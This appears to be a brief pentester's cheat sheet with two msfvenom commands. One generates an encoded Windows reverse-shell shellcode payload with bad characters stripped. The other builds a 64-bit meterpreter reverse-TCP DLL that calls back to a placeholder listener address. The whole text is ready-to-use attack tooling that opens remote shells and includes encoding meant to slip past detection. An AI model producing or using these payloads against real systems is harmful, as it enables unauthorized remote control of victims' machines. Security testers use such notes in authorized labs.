# MSFVENOM EXAMPLES
```
msfvenom -p windows/shell_reverse_tcp LHOST=[local ip] LPORT=[local port] EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

bad characters given as example, actual bad characters need to be determined
```

#64_bit_dll
```
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=[local ip] LPORT=[local port] > reverse_64bit.dll
```